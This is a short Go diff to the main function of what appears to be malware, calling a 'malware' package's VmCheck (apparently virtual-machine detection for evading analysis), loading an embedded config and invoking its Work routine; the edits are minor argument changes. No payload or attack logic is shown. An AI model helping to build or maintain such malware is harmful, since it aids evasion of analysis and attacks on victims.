@@ -11,7 +11,7 @@ var t string
 
 func main() {
 	malware.VmCheck()
-	config := malware.NewConfig("","","","","","",0)
+	config := malware.NewConfig("","","","","","",0,0)
 	err := config.UnmarshallConfig([]byte(t))
 	if err != nil {
 		return
@@ -35,7 +35,6 @@ func main() {
 		}
 		//get request
 		config.SetName(name)
-		malware.Work(config, key, name)
+		malware.Work(*config, key, name)
 	}
 }
-
